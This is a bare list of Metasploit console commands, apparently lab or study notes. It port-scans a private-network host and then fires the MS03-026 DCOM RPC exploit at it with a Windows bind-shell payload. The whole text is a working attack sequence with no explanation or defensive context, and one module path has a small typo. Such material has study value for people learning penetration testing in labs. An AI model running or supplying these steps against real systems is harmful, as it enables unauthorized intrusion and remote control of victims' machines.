use auxiliary/scanner/portscan/tcp
show options
set ports 1-500
ipconfig
set RHOST 192.168.1.100
run

search dcom
use exploit/windows.dcerpc/ms03_026_dcom
show options
set RHOST 192.168.1.100
set PAYLOAD windows/shell_bind_tcp
exploit

